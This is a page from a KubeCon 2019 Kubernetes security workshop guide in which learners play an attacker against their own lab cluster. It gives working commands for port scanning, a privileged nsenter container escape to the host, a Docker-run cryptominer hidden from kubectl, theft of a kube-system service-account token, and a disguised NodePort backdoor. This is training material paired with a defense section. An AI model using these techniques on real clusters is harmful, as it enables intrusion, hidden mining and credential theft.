
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
      <link rel="icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.2.2, mkdocs-material-7.2.4">
    
    
      
        <title>Scenario 2 Attack - KubeCon NA 2019 Tutorial Guide</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.f7f47774.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.3f5d1f46.min.css">
        
          
          
          <meta name="theme-color" content="#ef5552">
        
      
    
    
    
      
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>:root{--md-text-font-family:"Roboto";--md-code-font-family:"Roboto Mono"}</style>
      
    
    
    
    
      


    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="red" data-md-color-accent="red">
  
    
    <script>function __prefix(e){return new URL("..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script>
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#persistence-scenario-2-attack" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="KubeCon NA 2019 Tutorial Guide" class="md-header__button md-logo" aria-label="KubeCon NA 2019 Tutorial Guide" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19.35 10.03A7.49 7.49 0 0 0 12 4C9.11 4 6.6 5.64 5.35 8.03A6.004 6.004 0 0 0 0 14a6 6 0 0 0 6 6h13a5 5 0 0 0 5-5c0-2.64-2.05-4.78-4.65-4.97z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            KubeCon NA 2019 Tutorial Guide
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Scenario 2 Attack
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        
<a href="https://github.com/securekubernetes/securekubernetes/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    securekubernetes/securekubernetes
  </div>
</a>
      </div>
    
  </nav>
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="KubeCon NA 2019 Tutorial Guide" class="md-nav__button md-logo" aria-label="KubeCon NA 2019 Tutorial Guide" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19.35 10.03A7.49 7.49 0 0 0 12 4C9.11 4 6.6 5.64 5.35 8.03A6.004 6.004 0 0 0 0 14a6 6 0 0 0 6 6h13a5 5 0 0 0 5-5c0-2.64-2.05-4.78-4.65-4.97z"/></svg>

    </a>
    KubeCon NA 2019 Tutorial Guide
  </label>
  
    <div class="md-nav__source">
      
<a href="https://github.com/securekubernetes/securekubernetes/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    securekubernetes/securekubernetes
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        Introduction
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../gke/" class="md-nav__link">
        Getting Started
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../scenario_1_attack/" class="md-nav__link">
        Scenario 1 Attack
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../scenario_1_defense/" class="md-nav__link">
        Scenario 1 Defense
      </a>
    </li>
  

    
      
      
      

  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Scenario 2 Attack
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Scenario 2 Attack
      </a>
      
        
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#backstory" class="md-nav__link">
    Backstory
  </a>
  
    <nav class="md-nav" aria-label="Backstory">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#name-darkred" class="md-nav__link">
    Name: DarkRed
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#motivations" class="md-nav__link">
    Motivations
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#initial-foothold" class="md-nav__link">
    Initial Foothold
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#deploying-miners" class="md-nav__link">
    Deploying Miners
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#digging-in" class="md-nav__link">
    Digging In
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../scenario_2_defense/" class="md-nav__link">
        Scenario 2 Defense
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../bonus_challenges/" class="md-nav__link">
        Bonus Challenges
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../bonus_hints/" class="md-nav__link">
        Bonus Challenge Hints
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../bonus_1_walkthrough/" class="md-nav__link">
        Bonus 1 Walkthrough
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../bonus_2_walkthrough/" class="md-nav__link">
        Bonus 2 Walkthrough
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../wrapup/" class="md-nav__link">
        Wrap Up
      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#backstory" class="md-nav__link">
    Backstory
  </a>
  
    <nav class="md-nav" aria-label="Backstory">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#name-darkred" class="md-nav__link">
    Name: DarkRed
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#motivations" class="md-nav__link">
    Motivations
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#initial-foothold" class="md-nav__link">
    Initial Foothold
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#deploying-miners" class="md-nav__link">
    Deploying Miners
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#digging-in" class="md-nav__link">
    Digging In
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content" data-md-component="content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/securekubernetes/securekubernetes/edit/master/docs/scenario_2_attack.md" title="Edit this page" class="md-content__button md-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
                  </a>
                
                
                <h1 id="persistence-scenario-2-attack">Persistence: Scenario 2 Attack<a class="headerlink" href="#persistence-scenario-2-attack" title="Permanent link">&para;</a></h1>
<h2 id="backstory">Backstory<a class="headerlink" href="#backstory" title="Permanent link">&para;</a></h2>
<h3 id="name-darkred">Name: <strong>DarkRed</strong><a class="headerlink" href="#name-darkred" title="Permanent link">&para;</a></h3>
<ul>
<li>Highly Skilled</li>
<li>Sells Exfiltrated Data for $$</li>
<li>Evades detection and employs persistence</li>
<li>Uses env-specific tooling</li>
<li>Creates bespoke payloads</li>
<li>Expert Kubernetes knowledge</li>
</ul>
<h3 id="motivations">Motivations<a class="headerlink" href="#motivations" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>Red</strong> notices that the website is gone and the cryptominers have stopped reporting in.</li>
<li><strong>Red</strong> asks <strong>DarkRed</strong> for help trying to get back into the Kubernetes cluster and gives <strong>DarkRed</strong> the IP address.</li>
<li><strong>Red</strong> will split the revenue if <strong>DarkRed</strong> can get the miners back up and running.</li>
</ul>
<h2 id="initial-foothold">Initial Foothold<a class="headerlink" href="#initial-foothold" title="Permanent link">&para;</a></h2>
<p>Seeing that the URL included port <code>31337</code> and that <strong>Red</strong> said it was a Kubernetes <code>cluster</code>, it was likely to be exposed via a <code>NodePort</code> <code>service</code>. With this information, she has a feeling that more <code>services</code> might still be exposed to the web this way. <strong>DarkRed</strong> starts with indirect enumeration, such as searching on shodan.io, and follows up with direct port scanning via <code>nmap</code>.</p>
<p>To see what she'd see, from the Cloud Shell Terminal, scan the hundred ports around 31337 using a command similar to "nmap -sT -A -p 31300-31399 -T4 -n -v -Pn your-ip-address-goes-here". Be absolutely sure to scan your assigned IP address.</p>
<p>Your Cloud Shell has a little script to help:
<div class="highlight"><pre><span></span><code><span class="go">./attack-2-helper.sh</span>
</code></pre></div></p>
<p>This scan confirms <strong>DarkRed's</strong> suspicion that more services were present in this <code>cluster</code>. They all look like webservers, so explore them briefly with your browser.</p>
<p><strong>DarkRed</strong> notices that two of the services look like the company's main product, but the third is a juicy ops dashboard. Her intuition says that the dashboard is probably not maintained as carefully as the real product, and she focuses her attention there. Using tools such as <code>dirb</code>, <code>sqlmap</code>, <code>nikto</code>, and <code>burp</code>, she explores the dashboard, finds a vulnerability in a common web-development library, and exploits it to gain remote code execution on the server. For convenience, <strong>DarkRed</strong> installs a webshell for further exploration.</p>
<p>Now, let's become <strong>DarkRed</strong> and leverage this new access:</p>
<h2 id="deploying-miners">Deploying Miners<a class="headerlink" href="#deploying-miners" title="Permanent link">&para;</a></h2>
<p>The webshell can be found at <a href="http://your-ip:31336/webshell/" target="_blank"><a href="http://your-ip:31336/webshell/">http://your-ip:31336/webshell/</a></a>, and uses your workshop credentials as before.</p>
<p>Your Cloud Shell has a little script to help:</p>
<div class="highlight"><pre><span></span><code><span class="go">./attack-2-helper.sh</span>
</code></pre></div>
<p>Run a few commands to make sure it's working and gather some basic information:</p>
<div class="highlight"><pre><span></span><code><span class="go">id; uname -a; cat /etc/lsb-release /etc/redhat-release; ps -ef; env | grep -i kube</span>
</code></pre></div>
<p>Review the information. Check for Kubernetes access, and find the limits of our permissions:</p>
<div class="highlight"><pre><span></span><code><span class="go">export PATH=/tmp:$PATH</span>
<span class="go">cd /tmp; curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.16.4/bin/linux/amd64/kubectl; chmod 555 kubectl</span>
<span class="go">kubectl get pods</span>
<span class="go">kubectl get pods --all-namespaces</span>
<span class="go">kubectl get nodes</span>
<span class="go">kubectl auth can-i --list</span>
</code></pre></div>
<p>Now that we've reviewed the basic limits of our access, let's see if we can take over the host. If we can, that will give us many more options to fulfill our nefarious whims.</p>
<p>Using <a href="https://twitter.com/mauilion/status/1129468485480751104" target="_blank">a neat trick from Twitter</a>, let's attempt to deploy a container that gives us full host access:</p>
<div class="highlight"><pre><span></span><code><span class="go">kubectl run r00t --restart=Never -ti --rm --image lol --overrides &#39;{&quot;spec&quot;:{&quot;hostPID&quot;: true, &quot;containers&quot;:[{&quot;name&quot;:&quot;1&quot;,&quot;image&quot;:&quot;alpine&quot;,&quot;command&quot;:[&quot;nsenter&quot;,&quot;--mount=/proc/1/ns/mnt&quot;,&quot;--&quot;,&quot;/bin/bash&quot;],&quot;stdin&quot;: true,&quot;tty&quot;:true,&quot;imagePullPolicy&quot;:&quot;IfNotPresent&quot;,&quot;securityContext&quot;:{&quot;privileged&quot;:true}}]}}&#39;</span>
</code></pre></div>
<p>Let's unpack this a little bit: The kubectl run gets us a pod with a container, but the --overrides argument makes it special.</p>
<p>First we see <code>"hostPID": true</code>, which breaks down the most fundamental isolation of containers, letting us see all processes as if we were on the host.</p>
<p>Next, we use the nsenter command to switch to a different <code>mount</code> namespace. Which one? Whichever one init (pid 1) is running in, since that's guaranteed to be the host <code>mount</code> namespace! The result is similar to doing a <code>HostPath</code> mount and <code>chroot</code>-ing into it, but this works at a lower level, breaking down the <code>mount</code> namespace isolation completely. The <code>privileged</code> security context is necessary to prevent a permissions error accessing <code>/proc/1/ns/mnt</code>.</p>
<p>Convince yourself that you're really on the host, using some of our earlier enumeration commands:</p>
<div class="highlight"><pre><span></span><code><span class="go">id; uname -a; cat /etc/lsb-release /etc/redhat-release; ps -ef; env | grep -i kube</span>
</code></pre></div>
<p>It's been said that "if you have to SSH into a server for troubleshooting, you're doing Kubernetes wrong", so it's unlikely that cluster administrators are SSHing into nodes and running commands like <code>docker ps</code> directly.  By deploying our bitcoinero container via Docker on the host, it will show up in a <code>docker ps</code> listing.  However, Docker is managing the container directly and not the <code>kubelet</code>, so the malicious container <em>won't show up in a <code>kubectl get pods</code></em> listing.  Without additional detection capabilities, it's likely that the cluster administrator will never even notice.</p>
<p>First we verify Docker is working as expected, then deploy our cryptominer, and validate it seems to be running.</p>
<div class="highlight"><pre><span></span><code><span class="go">docker ps</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="go">docker run -d securekubernetes/bitcoinero -c1 -l10</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="go">docker container ls</span>
</code></pre></div>
<h2 id="digging-in">Digging In<a class="headerlink" href="#digging-in" title="Permanent link">&para;</a></h2>
<p>Now that <strong>DarkRed</strong> has fulfilled her end of the agreement and the miners are reporting in again, she decides to explore the cluster. With root access to the host, it's easy to explore any and all of the containers. Inspecting the production web app gives access to a customer database that may be useful later -- she grabs a copy of it for "safekeeping".</p>
<p>It would be nice to leave a backdoor for future access. Let's become <strong>DarkRed</strong> again and see what we can do:</p>
<p>First, let's steal the kubelet's client certificate, and check to see if it has heightened permissions:</p>
<div class="highlight"><pre><span></span><code><span class="go">ps -ef | grep kubelet</span>
</code></pre></div>
<p>Note the path to the kubelet's kubeconfig file: /var/lib/kubelet/kubeconfig</p>
<div class="highlight"><pre><span></span><code><span class="go">kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system</span>
</code></pre></div>
<p>Looks good! Let's try it:</p>
<div class="highlight"><pre><span></span><code><span class="go">kubectl --kubeconfig /var/lib/kubelet/kubeconfig run testing --image=busybox --rm -i -t -n kube-system --command echo &quot;success&quot;</span>
</code></pre></div>
<p>Oh no! This isn't going to work. Let's try stealing the default kube-system service account token and check those permissions. We'll need to do a little UNIX work to find them, since we're not exactly using the public API.</p>
<div class="highlight"><pre><span></span><code><span class="go">TOKEN=$(for i in `mount | sed -n &#39;/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p&#39;`; do if [ `cat $i` = &#39;kube-system&#39; ]; then cat `echo $i | sed &#39;s/.namespace$/\/token/&#39;`; break; fi; done)</span>
<span class="go">echo -e &quot;\n\nYou&#39;ll want to copy this for later:\n\nTOKEN=\&quot;$TOKEN\&quot;&quot;</span>
</code></pre></div>
<p><div class="highlight"><pre><span></span><code><span class="go">kubectl --token &quot;$TOKEN&quot; --insecure-skip-tls-verify --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT auth can-i get secrets --all-namespaces</span>
</code></pre></div>
Yes, this looks better! We save that token in our PalmPilot for later use, and publish a NodePort that will let us access the cluster remotely in the future:</p>
<div class="highlight"><pre><span></span><code><span class="go">cat &lt;&lt;EOF | kubectl --token &quot;$TOKEN&quot; --insecure-skip-tls-verify --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT apply -f -</span>
<span class="go">apiVersion: v1</span>
<span class="go">kind: Service</span>
<span class="go">metadata:</span>
<span class="go">  name: istio-mgmt</span>
<span class="go">  namespace: kube-system</span>
<span class="go">spec:</span>
<span class="go">  type: NodePort</span>
<span class="go">  ports:</span>
<span class="go">    - protocol: TCP</span>
<span class="go">      nodePort: 31313</span>
<span class="go">      port: 31313</span>
<span class="go">      targetPort: $KUBERNETES_SERVICE_PORT</span>
<span class="go">---</span>
<span class="go">apiVersion: v1</span>
<span class="go">kind: Endpoints</span>
<span class="go">metadata:</span>
<span class="go">  name: istio-mgmt</span>
<span class="go">  namespace: kube-system</span>
<span class="go">subsets:</span>
<span class="go">  - addresses:</span>
<span class="go">      - ip: `sed -n &#39;s/^  *server: https:\/\///p&#39; /var/lib/kubelet/kubeconfig`</span>
<span class="go">    ports:</span>
<span class="go">      - port: $KUBERNETES_SERVICE_PORT</span>
<span class="go">EOF</span>
</code></pre></div>
<p>Press control-d to exit (and delete) the <code>r00t</code> pod.</p>
<p>If you like, you may validate that external access is working, using cloud shell:</p>
<div class="highlight"><pre><span></span><code><span class="go">if [ -z &quot;$TOKEN&quot; ]; then</span>
<span class="go">  echo -e &quot;\n\nPlease paste in the TOKEN=\&quot;...\&quot; line and try again.&quot;</span>
<span class="go">else</span>
<span class="go">  EXTERNAL_IP=`gcloud compute instances list --format json | jq &#39;.[0][&quot;networkInterfaces&quot;][0][&quot;accessConfigs&quot;][0][&quot;natIP&quot;]&#39; | sed &#39;s/&quot;//g&#39;`</span>
<span class="go">  kubectl --token &quot;$TOKEN&quot; --insecure-skip-tls-verify --server &quot;https://${EXTERNAL_IP}:31313&quot; get pods --all-namespaces</span>
<span class="go">fi</span>
</code></pre></div>
<p>Now we have remote Kubernetes access, and our associate's bitcoinero containers are invisible. All in a day's work.</p>
                
              
              
                


              
            </article>
          </div>
        </div>
        
      </main>
      
        
<footer class="md-footer">
  
    <nav class="md-footer__inner md-grid" aria-label="Footer">
      
        
        <a href="../scenario_1_defense/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Scenario 1 Defense" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              Scenario 1 Defense
            </div>
          </div>
        </a>
      
      
        
        <a href="../scenario_2_defense/" class="md-footer__link md-footer__link--next" aria-label="Next: Scenario 2 Defense" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Next
              </span>
              Scenario 2 Defense
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        Made with
        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
          Material for MkDocs
        </a>
        
      </div>
      
  <div class="md-footer-social">
    
      
      
        
        
      
      <a href="https://github.com/securekubernetes/securekubernetes" target="_blank" rel="noopener" title="github.com" class="md-footer-social__link">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg>
      </a>
    
  </div>

    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    <script id="__config" type="application/json">{"base": "..", "features": [], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../assets/javascripts/workers/search.709b4209.min.js", "version": null}</script>
    
    
      <script src="../assets/javascripts/bundle.febc23d1.min.js"></script>
      
    
  </body>
</html>